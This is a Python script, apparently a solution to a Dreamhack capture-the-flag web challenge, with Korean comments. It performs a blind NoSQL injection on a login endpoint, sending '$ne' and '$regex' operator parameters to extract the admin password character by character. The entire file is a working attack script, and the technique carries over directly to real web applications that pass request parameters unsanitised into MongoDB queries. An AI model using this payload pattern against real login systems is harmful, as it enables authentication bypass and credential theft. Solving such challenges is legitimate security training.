import requests
import string

# 문제 서버 주소
url = "http://host8.dreamhack.games:8287/login"

# DH{32alphanumeric} 형식
flag = ""
charset = string.ascii_letters + string.digits  # a-z, A-Z, 0-9

print("Starting NoSQL Injection attack...")
print("Target: admin password (DH{...})")

# 32글자를 찾아야 함
while len(flag) < 32:
    found = False
    for char in charset:
        # NoSQL Injection payload
        # uid는 admin이 아닌 것으로, upw는 정규식으로 매칭
        params = {
            'uid[$ne]': 'guest',  # admin 문자열 직접 사용 안함
            'upw[$regex]': f'^[Dd][Hh]{{{flag}{char}'  # DH{ + 현재까지 찾은 문자 + 시도할 문자
        }
        
        try:
            response = requests.get(url, params=params)
            
            # undefined가 아니면 매칭 성공
            if response.text not in ['undefined', 'filter', 'err']:
                flag += char
                print(f"[+] Found character: {char}")
                print(f"[+] Current progress: DH{{{flag}}}")
                found = True
                break
                
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    
    if not found:
        print(f"[-] No character found at position {len(flag)}")
        print("[-] Trying with different approach...")
        break

# 닫는 중괄호 찾기
if len(flag) == 32:
    params = {
        'uid[$ne]': 'guest',
        'upw': f'DH{{{flag}}}'  # 완전한 플래그로 시도
    }
    response = requests.get(url, params=params)
    if response.text not in ['undefined', 'filter', 'err']:
        final_flag = f'DH{{{flag}}}'
        print(f"\n[+] SUCCESS!")
        print(f"[+] Flag: {final_flag}")
    else:
        print(f"\n[+] Possible flag: DH{{{flag}}}")
else:
    print(f"\n[+] Partial flag: DH{{{flag}}}")